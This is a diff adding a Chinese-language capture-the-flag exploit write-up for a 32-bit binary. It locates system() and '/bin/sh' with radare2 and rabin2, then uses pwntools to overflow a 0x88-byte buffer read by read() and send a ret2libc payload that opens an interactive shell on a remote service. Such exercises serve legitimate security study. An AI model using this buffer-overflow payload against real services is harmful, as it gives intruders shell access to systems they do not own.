@@ -1,3 +1,25 @@
 # 構建 ROP Chain
-# (1) 用 r2 靜態分析 找到 sym.imp.system (0x08048320)
-# (2) 用 rabin2 輸出字串 找到 '/bin/sh' (0x0804a024)
+
+1. 在 main() 函式中看到程式會先跳進 sym.vulnerable_function(), 進去觀察
+2. 進入後, 會有 sym.imp.read() 讀取輸入內容, 有長度限制 0x100, 區域變數 [var_88h] (0x88), 可進行 Overflow (構建 ROP)
+
+shell: 
+# 用 r2 靜態分析 找到 sym.imp.system (0x08048320)
+shell_1 = 0x08048320
+# 用 rabin2 -z 輸出字串 找到 '/bin/sh' (0x0804a024)
+shell_2 = 0x0804a024
+
+
+構建 payload:
+# 程式是 32 位元的, 所以 ebp = 0x4
+# buf ('a' * 0x88)  + ebp ('a' * 0x4) + shell_1 (0x08048320) + ret ('a' * 0x4) + shell_2 (0x0804a024)
+# 呼叫 sym.imp.system() 函數 (shell_1) 後, 會緊接函數返回地址, 此時需要填充 0x4 的字串才能達到新的棧頂位置
+payload = 'a' * 0x88 + 'a' * 0x4 + p32(shell_1) + 'a' * 0x4 + p32(shell_2)
+
+r = remote('ip', port)
+# local 端: r = process('./filename')
+
+r.recvuntil('\n')
+r.sendline(payload)
+
+r.interactive()
